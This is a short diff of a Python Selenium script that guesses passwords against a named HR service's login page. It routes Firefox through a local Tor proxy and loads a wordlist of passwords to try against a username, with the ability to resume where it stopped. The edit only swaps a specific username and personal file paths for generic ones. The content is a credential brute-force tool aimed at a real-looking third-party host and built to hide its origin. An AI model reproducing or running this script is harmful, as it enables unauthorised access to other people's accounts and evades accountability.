@@ -27,16 +27,16 @@ options.binary_location = firefox_path
 options.add_argument('--proxy-server=socks5://127.0.0.1:9050')
 
 # Initialize the WebDriver with the Service object
-service = Service(executable_path=gecko_driver_path, log_path='/home/blackbike/PT/geckodriver.log')
+service = Service(executable_path=gecko_driver_path, log_path='/home/geckodriver.log')
 driver = webdriver.Firefox(service=service, options=options)
 
 # URL of the login page
 login_url = 'https://textrip.peopleshr.com/hr/security/login'
 driver.get(login_url)
 
-# Load usernames
-usernames = ['nandasena']
-with open('/home/blackbike/PT/combined_wordlist_temp.txt', 'r') as file:
+# Load usernames and wordlist here
+usernames = ['user']
+with open('/home/wordlist_temp.txt', 'r') as file:
     passwords = file.read().splitlines()
 
 # Load last attempt to start from there
